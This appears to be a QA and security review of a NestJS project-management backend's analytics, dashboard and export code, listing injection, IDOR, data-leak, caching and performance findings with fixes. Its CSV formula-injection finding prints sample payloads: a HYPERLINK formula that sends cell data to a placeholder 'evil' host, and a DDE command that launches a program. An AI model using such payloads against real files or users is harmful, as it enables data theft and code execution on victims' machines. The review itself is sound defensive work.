# QA Review — Analytics, Dashboard, Export

Files opened:
- `web/back-nest/src/analytics/analytics-cache.service.ts`
- `web/back-nest/src/analytics/analytics.controller.ts`
- `web/back-nest/src/analytics/analytics.module.ts`
- `web/back-nest/src/analytics/analytics.service.ts`
- `web/back-nest/src/dashboard/dashboard.controller.ts`
- `web/back-nest/src/dashboard/dashboard.module.ts`
- `web/back-nest/src/dashboard/dashboard.service.ts`
- `web/back-nest/src/export/export.controller.ts`
- `web/back-nest/src/export/export.module.ts`
- `web/back-nest/src/export/export.service.ts`

Cross-referenced for evidence:
- `web/back-nest/prisma/schema.prisma` (lines 20-264, 518-525 — indexes, columns)
- `web/back-nest/src/common/result.ts` (Result shape)

---

## Summary Table

| # | Severity | Title |
|---|----------|-------|
| 1 | CRITICAL | CSV formula-injection — unfiltered user content written to `.csv` |
| 2 | HIGH | `exportJson` leaks full `Project` rows (including `aiOutput` and any future sensitive column) to any PM |
| 3 | HIGH | Analytics cache is never invalidated on write — stale 15-min data even after bulk status changes |
| 4 | HIGH | Export memory blow-up: full rowset buffered in a single string, no streaming, no row limit |
| 5 | HIGH | `export/projects/json` permits any PM to download every active project in the tenant |
| 6 | HIGH | `getRecentActivity` accepts unbounded `count` query param → can request all activity rows |
| 7 | MEDIUM | Dashboard `getStats` executes 10 sequential DB calls (6 parallel + 4 sequential) — re-fetches workloads/activities already computed elsewhere |
| 8 | MEDIUM | `DashboardController` still uses legacy `@Roles` — inconsistent with `AnalyticsController` permission model |
| 9 | MEDIUM | Full-scan on `ProjectActivity` with no filter + no pagination in `getPhaseVelocity` |
| 10 | MEDIUM | No index on `Project.endDate` — overdue queries scan all active projects |
| 11 | MEDIUM | `ids` query param in Export accepts unlimited IDs → MySQL `IN (...)` explosion |
| 12 | MEDIUM | CSV quote-escaping broken — a project name containing `"` produces invalid CSV |
| 13 | MEDIUM | `getActivityStats` uses `getDay()` without locale awareness (week starts Sunday) |
| 14 | LOW | `exportCsv` filename uses `Date.now()` — clock-drift risk, not a security issue |
| 15 | LOW | Analytics service type-casts `projects as unknown as ProjectRow[]` — bypasses Prisma types |
| 16 | LOW | `any` used for Prisma `where` in export service |

---

### [CRITICAL] CSV formula injection in `exportCsv`
- File: `web/back-nest/src/export/export.service.ts:20-25`
- Category: Injection / Spreadsheet Formula Injection (CWE-1236)
- Evidence:
```ts
const header = 'Nom;Client;Chef de projet;Email PM;Statut;Priorité;Date début;Date fin;Créé le\n';
const rows = projects.map((p) => {
  const pm = p.projectManager ? `${p.projectManager.firstName} ${p.projectManager.lastName}` : '';
  const pmEmail = p.projectManager?.email ?? '';
  return `"${p.name}";"${p.clientName}";"${pm}";"${pmEmail}";"${p.status}";"${p.priority}";"${p.startDate.toISOString().slice(0, 10)}";"${p.endDate.toISOString().slice(0, 10)}";"${p.createdAt.toISOString().slice(0, 10)}"`;
});
```
- Impact: `p.name`, `p.clientName`, `firstName`, `lastName`, and `email` are user-controlled. A PM (or admin who accepted a project name from a client) can set e.g. `name = '=HYPERLINK("http://evil/"&A1,"click me")'` or `=cmd|'/C calc'!A1`. When the target CSV is opened in Excel / LibreOffice / Google Sheets, the formula executes in the recipient's context — classic CSV injection (OWASP "Formula Injection"). No escaping, no prefix stripping, no `'` guard.
- Fix: Sanitize every field before quoting. If the raw value starts with any of `=`, `+`, `-`, `@`, `\t`, `\r`, prepend an apostrophe (or wrap the cell with a zero-width prefix). Also double-up embedded `"` per RFC 4180 (see bug #12). Consider using a library such as `csv-stringify` which handles both concerns.

---

### [HIGH] `exportJson` leaks full `Project` rows to every PM
- File: `web/back-nest/src/export/export.service.ts:30-45`
- Category: Over-exposure of sensitive data / Missing tenant filter
- Evidence:
```ts
async exportJson(ids?: string[]) {
  const where: any = { isDeleted: false };
  if (ids?.length) where.id = { in: ids };

  const projects = await this.prisma.project.findMany({
    where,
    include: {
      projectManager: { select: { firstName: true, lastName: true, email: true } },
      fields: true,
      fieldValues: { include: { field: true } },
    },
    orderBy: { createdAt: 'desc' },
  });

  return Result.ok(projects);
}
```
- Impact:
  1. Because `projects` is returned without a `select`, every column of `Project` is included — crucially `aiOutput` (free-text AI summary), `tags`, `budget`, and any column added later. A new sensitive column (e.g. an internal audit note) will automatically leak.
  2. There is no tenant / ownership scoping. A single `ProjectManager` with `api/export/projects/json` access can dump the whole table (60K rows are not implausible; see bug #4 for memory effect).
  3. The controller guard is `@Roles('Admin','ProjectManager')` (see `export.controller.ts:10`) — any PM can exfiltrate _every_ project they do not manage.
- Fix: Tight `select` allowlist. Scope by `projectManagerId` when role is `ProjectManager`. Reject unrecognized columns.

---

### [HIGH] Analytics cache never invalidated on underlying data change
- File: `web/back-nest/src/analytics/analytics-cache.service.ts:1-37`, `web/back-nest/src/analytics/analytics.service.ts:43, 60-61, 116-117, 159-160, 206-207`
- Category: Data freshness / Stale cache
- Evidence:
```ts
// analytics-cache.service.ts
async get<T>(key: string, ttlMinutes: number): Promise<T | null> {
  const entry = await this.prisma.analyticsCache.findUnique({ where: { cacheKey: key } });
  if (!entry) return null;
  const ageMs = Date.now() - entry.computedAt.getTime();
  const ttlMs = ttlMinutes * 60 * 1000;
  if (ageMs > ttlMs) return null;
  ...
}
// analytics.service.ts
const CACHE_TTL = 15; // minutes
const cached = await this.cache.get<PhaseVelocityRow[]>('phase_velocity', CACHE_TTL);
if (cached) return Result.ok(cached);
```
A project-wide grep for `cache.delete` / `cache.clear` / `invalidate` under `src/analytics` returned only the `AnalyticsCacheService.set` upsert — no delete path anywhere in the codebase.
- Impact: After a status change or project creation, analytics keep returning pre-change data for up to 15 minutes. For the `deadline_risk` metric this is particularly misleading — a project can be marked Completed and still show a 100 riskScore for ≤15 min. Cache cannot be forcibly refreshed by an operator.
- Fix: Add `AnalyticsCacheService.invalidate(key?: string)` (delete row or wildcard) and call it from `ProjectsService` after status/endDate/priority changes. Expose `DELETE /api/analytics/cache` for admins. Consider a very short TTL (1-2 min) combined with event-driven invalidation for the remaining windows.

---

### [HIGH] Export streams entire resultset into a single string buffer
- File: `web/back-nest/src/export/export.service.ts:13-27, 34-44, 58-78`
- Category: Memory / DoS
- Evidence:
```ts
const projects = await this.prisma.project.findMany({ where, include: { projectManager: ... }, orderBy: { createdAt: 'desc' } });
...
return Result.ok({ content: BOM + header + rows.join('\n'), contentType: 'text/csv; charset=utf-8', fileName: ... });
```
There is no `take:` / pagination / `createReadStream`. `exportJson` additionally hydrates `fields` and `fieldValues` per row — each Project may have dozens of nested rows.
- Impact: A tenant with 20K projects × ~30 field values × ~300 bytes each → ~180 MB in a single Node string, held in V8 heap for the life of `res.send`. Concurrent requests × default NestJS heap (≈ 1.7 GB) → OOM and process restart. Same risk on JSON response. No rate limit on the endpoint.
- Fix: Stream rows using Prisma cursor pagination + `Response.write` (CSV) or a streaming JSON writer (`ndjson` or JSONStream). Cap max rows per request (e.g. 5 000) and require date/id filters otherwise.

---

### [HIGH] Export endpoint authorization is role-only, no ownership check
- File: `web/back-nest/src/export/export.controller.ts:8-29`
- Category: Access control / IDOR
- Evidence:
```ts
@Controller('api/export')
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('Admin', 'ProjectManager')
export class ExportController {
  @Get('projects/csv')
  async exportCsv(@Query('ids') ids: string, @Res() res: Response) {
    const idList = ids ? ids.split(',').filter(Boolean) : undefined;
    const result = await this.service.exportCsv(idList);
    ...
  }
  @Get('projects/json')
  async exportJson(@Query('ids') ids: string) {
    const idList = ids ? ids.split(',').filter(Boolean) : undefined;
    ...
  }
  @Get('projects/:projectId/report')
  async getReport(@Param('projectId') projectId: string) { ... }
```
- Impact: Any authenticated `ProjectManager` can fetch the CSV / JSON / report of projects they do not manage (`projectManagerId` is never compared to `req.user.id`). `ids` filter is user-supplied — a PM simply omits or guesses IDs and gets everything. The per-project `getReport` (`:projectId`) similarly has no ownership check.
- Fix: Inject `@CurrentUser()`, and when `role === 'ProjectManager'`, force `where.projectManagerId = user.id`. For `getReport`, assert project ownership before returning. Admins keep full access.

---

### [HIGH] `getRecentActivity(count)` accepts unbounded, unvalidated `count`
- File: `web/back-nest/src/dashboard/dashboard.controller.ts:32-35`, `web/back-nest/src/dashboard/dashboard.service.ts:67-75`
- Category: DoS / Input validation
- Evidence:
```ts
@Get('recent-activity')
async getRecentActivity(@Query('count') count = '10') {
  const result = await this.service.getRecentActivity(+count);
  return result.value;
}
```
```ts
async getRecentActivity(count = 10) {
  const activities = await this.prisma.projectActivity.findMany({
    include: { project: { ... }, user: { ... } },
    orderBy: { createdAt: 'desc' },
    take: count,
  });
  ...
}
```
- Impact: `GET /api/dashboard/recent-activity?count=10000000` becomes `take: 10_000_000` with two `include` joins. Prisma/MariaDB will happily try. Also: `+count` returns `NaN` for non-numeric input; Prisma throws but only after the guard has already allowed the request. Negative values flow through.
- Fix: Clamp in controller: `Math.min(Math.max(1, +count || 10), 100)`. Reject NaN. Consider zod validation pipe.

---

### [MEDIUM] Dashboard `getStats` does 10 DB calls — 6 parallel + 4 serial (re-runs sub-queries)
- File: `web/back-nest/src/dashboard/dashboard.service.ts:9-39`
- Category: Performance / N+1-style aggregation
- Evidence:
```ts
const [total, active, completed, archived, overdue, thisMonth] = await Promise.all([
  this.prisma.project.count({ where: { isDeleted: false } }),
  this.prisma.project.count({ where: { isDeleted: false, status: { in: [...] } } }),
  this.prisma.project.count({ where: { isDeleted: false, status: 'Completed' } }),
  this.prisma.project.count({ where: { isDeleted: false, status: 'Archived' } }),
  this.prisma.project.count({ where: { isDeleted: false, endDate: { lt: now }, status: { notIn: [...] } } }),
  this.prisma.project.count({ where: { isDeleted: false, createdAt: { gte: startOfMonth } } }),
]);

const byStatus = await this.getProjectsByStatus();
const byPriority = await this.prisma.project.groupBy({ by: ['priority'], where: { isDeleted: false }, _count: true });
const workloads = await this.getWorkloads();
const recentActivities = await this.getRecentActivity(10);
```
- Impact: 6 of the counts can be derived from a single `groupBy(status)` (which is _also_ called two lines later via `getProjectsByStatus`). The 4 trailing calls are serial — total round-trip is 6 parallel + 4 serial waits instead of 2 parallel batches. Under load this is wasted DB time and wasted MariaDB buffer pool.
- Fix: Collapse counts into one `groupBy(status)` + one `groupBy(priority)` + one `count(createdAt >= startOfMonth)`. Move the remaining 4 calls (`byStatus`, `byPriority`, `workloads`, `recentActivities`) into the same `Promise.all`.

---

### [MEDIUM] `DashboardController` uses legacy `@Roles` while siblings use permissions
- File: `web/back-nest/src/dashboard/dashboard.controller.ts:7-10` vs `web/back-nest/src/analytics/analytics.controller.ts:7-9`
- Category: Inconsistent authorization model
- Evidence:
```ts
// dashboard.controller.ts
@Controller('api/dashboard')
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('Admin', 'ProjectManager')
```
```ts
// analytics.controller.ts
@Controller('api/analytics')
@UseGuards(JwtAuthGuard, PermissionsGuard)
@RequirePermission('analytics.view')
```
- Impact: Analytics migrated to the data-driven `Permission` model (see `schema.prisma:81-118`), Dashboard and Export have not. A role renamed or split via the new `UserRoleAssignment` mechanism will silently drop Dashboard/Export access or leave it over-broad. CLAUDE.md also mentions `legacy @Roles still used?` as a known concern.
- Fix: Introduce `dashboard.view` and `export.projects` permissions; migrate both controllers to `PermissionsGuard + @RequirePermission(...)`.

---

### [MEDIUM] Full-scan on `ProjectActivity` with no filter / no pagination
- File: `web/back-nest/src/analytics/analytics.service.ts:63-67`
- Category: Scalability / Full-table scan
- Evidence:
```ts
const activities = await this.prisma.projectActivity.findMany({
  where: { action: 'status_change', detail: { not: null } },
  orderBy: [{ projectId: 'asc' }, { createdAt: 'asc' }],
  select: { projectId: true, detail: true, createdAt: true },
});
```
`ProjectActivity` has only `@@index([projectId])` and `@@index([createdAt])` (schema.prisma:261-263). Neither helps for `action = 'status_change'`. For a 1M-row activity table this is a full scan every 15 min (or whenever cache expires).
- Impact: Analytics page loads degrade linearly with activity history. Also no date window — old years of activity are re-scanned forever.
- Fix: Add `@@index([action, createdAt])`. Restrict to the last N months (e.g. 12). For per-project segmentation the current iteration in JS is fine, but consider aggregating in SQL if scale grows.

---

### [MEDIUM] No index on `Project.endDate`
- File: `web/back-nest/prisma/schema.prisma:137-193` (and consumers `dashboard.service.ts:18, 127`, `analytics.service.ts:165-173`)
- Category: Missing index / Full scan
- Evidence: The `Project` model declares `@@index([status])`, `@@index([projectManagerId])`, `@@index([isDeleted])`, `@@index([priority])`, `@@index([createdAt])`, `@@index([isDeleted, status])`. No index covers `endDate`. The dashboard overdue query (`endDate: { lt: now }, status: { notIn: [...] }`) and analytics deadline risk use `endDate`.
- Impact: Linear scan of all non-deleted projects on each overdue/deadline query. Not catastrophic today but grows O(projects).
- Fix: Add `@@index([isDeleted, endDate])` or a composite `(isDeleted, status, endDate)`.

---

### [MEDIUM] Unlimited IDs in export `ids=` query
- File: `web/back-nest/src/export/export.controller.ts:15-16, 25-27`
- Category: Input validation / Query explosion
- Evidence:
```ts
async exportCsv(@Query('ids') ids: string, @Res() res: Response) {
  const idList = ids ? ids.split(',').filter(Boolean) : undefined;
```
No length cap, no UUID-shape check. Raw `.filter(Boolean)` also lets through arbitrary strings.
- Impact: `?ids=a,a,a,...` (100k repeated) yields a huge `IN (...)` clause MariaDB will reject or handle slowly. Also lets a caller smuggle arbitrary non-UUID strings into Prisma.
- Fix: Validate each id with `z.string().uuid()`; cap list at e.g. 200.

---

### [MEDIUM] CSV quoting is broken for values containing `"`
- File: `web/back-nest/src/export/export.service.ts:21-24`
- Category: Output correctness / CSV conformance (RFC 4180)
- Evidence:
```ts
return `"${p.name}";"${p.clientName}";...`;
```
- Impact: A project name like `He said "hi"` becomes `"He said "hi""` — Excel / LibreOffice interpret the embedded unescaped `"` as end-of-field and the rest of the row shifts. For French customers with apostrophes / quotation marks this is frequent.
- Fix: Per RFC 4180, double every `"` inside a quoted field: `value.replace(/"/g, '""')`. Combine with fix for bug #1. Consider a library (`csv-stringify`, `papaparse`).

---

### [MEDIUM] Week boundary uses JavaScript `getDay()` (Sunday=0)
- File: `web/back-nest/src/dashboard/dashboard.service.ts:94-97`
- Category: Locale / correctness
- Evidence:
```ts
const startOfWeek = new Date(startOfToday);
startOfWeek.setDate(startOfToday.getDate() - startOfToday.getDay());
```
- Impact: In France (ISO-8601), the week starts Monday. On a Sunday the current implementation resets to the same Sunday (OK) but on Monday it rolls back 1 day to Sunday — i.e. counts last-week data as this week. The product is a FR-speaking deployment tool (French status labels in `analytics.service.ts:48`).
- Fix: `const offset = (startOfToday.getDay() + 6) % 7;` to anchor on Monday, or use `date-fns/startOfWeek` with `{ weekStartsOn: 1 }`.

---

### [LOW] CSV filename uses `Date.now()`
- File: `web/back-nest/src/export/export.service.ts:27`
- Category: UX / collisions
- Evidence: `fileName: \`projets-export-${Date.now()}.csv\``
- Impact: Non-deterministic; fine for download but not suitable for client-side dedup. Two concurrent requests may both generate the same ms-precision name. Not a security issue.
- Fix: Include an ISO date (`new Date().toISOString().replace(/[:.]/g, '-')`).

---

### [LOW] `as unknown as ProjectRow[]` bypasses Prisma types
- File: `web/back-nest/src/analytics/analytics.service.ts:163-173`
- Category: Type safety
- Evidence:
```ts
type ProjectRow = { id: string; name: string; status: string; endDate: Date; projectManager: { firstName: string; lastName: string } | null };
const projects = await this.prisma.project.findMany({
  where: { isDeleted: false, status: { notIn: TERMINAL_STATUSES } },
  include: { projectManager: { select: { firstName: true, lastName: true } } },
}) as unknown as ProjectRow[];
```
- Impact: Silences type errors if schema drifts. Prisma's inferred type already matches — cast is unnecessary. `rules/typescript/coding-style.md` flags `any` / broad casts as bad practice.
- Fix: Remove the cast; rely on Prisma inference. If you want a narrower shape, use `select:` instead of `include:` and let the generic type flow.

---

### [LOW] `where: any` in export service
- File: `web/back-nest/src/export/export.service.ts:10, 31`
- Category: Type safety
- Evidence: `const where: any = { isDeleted: false };`
- Impact: Type-checks can't catch mistakes in this block. `rules/typescript/coding-style.md` explicitly prohibits `any` in application code.
- Fix: `Prisma.ProjectWhereInput`.

---

## Issue Focus Matrix (per task brief)

| Focus area | Verdict |
|---|---|
| Analytics cache TTL / stale forever | Serves stale until 15 min TTL expires; no invalidation path (see bug #3). |
| Cache key collision per user | N/A — keys are global (`phase_velocity`, `bottleneck_heatmap`, `deadline_risk`, `team_workload`). Analytics are tenant-wide and not user-scoped, so keys are correct, **but** the cache also means data is effectively shared across any caller who can read analytics. |
| Dashboard N+1 / missing indexes | Bug #7, #9, #10. |
| Export CSV / XLSX injection | Bug #1 (CSV). No XLSX exporter exists in scope. |
| Export memory blow-up / streaming | Bug #4 (buffered string for full resultset). |
| Missing role/permission guards | Bug #5 (IDOR on export), bug #8 (legacy @Roles on Dashboard/Export). |
| Sensitive data in exports | Bug #2 — JSON export returns whole `Project` row (includes `aiOutput`, `tags`, `budget`). `passwordHash` is NOT leaked because `projectManager` uses `select: { firstName, lastName, email }` — good. |
| Date-range OOM | [UNCERTAIN] — no endpoints in scope accept `from`/`to`. Analytics fetch full history (see bug #9) but no caller-controlled range. |

---

## Not Reviewed / Out of Scope

- XLSX / PDF export: no file in scope.
- Caching layer for dashboard: there is none (only analytics caches).
- Rate limiting: [UNCERTAIN] — not set in these files; would require reading `app.module.ts` / middleware.
- WebSocket / notifications interaction with stale analytics cache: [UNCERTAIN] — not inspected.
